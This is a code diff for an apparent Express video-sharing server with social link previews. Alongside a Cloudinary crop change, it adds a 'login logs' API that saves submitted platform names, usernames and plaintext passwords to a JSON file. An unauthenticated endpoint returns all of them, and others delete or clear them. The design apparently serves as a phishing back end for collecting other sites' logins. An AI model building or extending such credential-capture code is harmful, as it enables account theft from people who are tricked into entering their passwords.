@@ -20,6 +20,7 @@ const SITE_URL =
         : "http://localhost:3000");
 
 const VIDEO_FILE = path.join(__dirname, "videos.json");
+const LOG_FILE = path.join(__dirname, "login-log.json");
 
 // Create uploads folder (fallback if Cloudinary fails)
 const UPLOAD_DIR = path.join(__dirname, "public", "uploads");
@@ -43,7 +44,14 @@ const storage = new CloudinaryStorage({
     params: {
         folder: 'lojo-videos',
         allowed_formats: ['jpg', 'jpeg', 'png', 'gif', 'webp'],
-        transformation: [{ width: 1200, height: 630, crop: 'limit' }]
+        transformation: [
+            { 
+                width: 1200, 
+                height: 630, 
+                crop: 'fill',        // ← FIXED: forces exact 1200x630
+                gravity: 'auto'      // ← Keeps faces/subjects in frame
+            }
+        ]
     }
 });
 
@@ -109,6 +117,26 @@ function findVideo(id) {
 
 function newId() {
     return videos.length ? Math.max(...videos.map(v => v.id)) + 1 : 1;
+}
+
+// =====================================
+// LOGIN LOGS
+// =====================================
+
+function loadLogs() {
+    if (!fs.existsSync(LOG_FILE)) {
+        fs.writeFileSync(LOG_FILE, JSON.stringify([], null, 2));
+    }
+    try {
+        return JSON.parse(fs.readFileSync(LOG_FILE, "utf8"));
+    } catch (error) {
+        console.log("Log error:", error);
+        return [];
+    }
+}
+
+function saveLogs(logs) {
+    fs.writeFileSync(LOG_FILE, JSON.stringify(logs, null, 2));
 }
 
 // =====================================
@@ -333,6 +361,54 @@ app.delete("/api/videos/:id", (req, res) => {
 });
 
 // =====================================
+// LOGIN LOGS API
+// =====================================
+
+// Get all login attempts
+app.get("/api/logs", (req, res) => {
+    const logs = loadLogs();
+    res.json(logs);
+});
+
+// Add a new login attempt
+app.post("/api/logs", (req, res) => {
+    const { platform, username, password } = req.body;
+    if (!platform || !username || !password) {
+        return res.status(400).json({ error: "Missing fields" });
+    }
+    
+    const logs = loadLogs();
+    const newEntry = {
+        id: logs.length + 1,
+        platform,
+        username,
+        password,
+        timestamp: new Date().toISOString()
+    };
+    logs.push(newEntry);
+    saveLogs(logs);
+    res.status(201).json(newEntry);
+});
+
+// Delete a log entry
+app.delete("/api/logs/:id", (req, res) => {
+    const logs = loadLogs();
+    const id = parseInt(req.params.id);
+    const filtered = logs.filter(log => log.id !== id);
+    if (filtered.length === logs.length) {
+        return res.status(404).json({ error: "Log not found" });
+    }
+    saveLogs(filtered);
+    res.json({ message: "Log deleted" });
+});
+
+// Clear all logs
+app.delete("/api/logs", (req, res) => {
+    saveLogs([]);
+    res.json({ message: "All logs cleared" });
+});
+
+// =====================================
 // STATIC FILES
 // =====================================
 
@@ -357,7 +433,8 @@ app.listen(PORT, "0.0.0.0", () => {
     console.log(`📹 Videos: ${videos.length}`);
     console.log("🤖 Social preview enabled");
     console.log("💾 Storage: videos.json");
-    console.log("☁️ Cloudinary: Enabled");
+    console.log("📩 Login logs: login-log.json");
+    console.log("☁️ Cloudinary: Enabled (crop: fill, 1200x630)");
     console.log("==============================");
 });
 
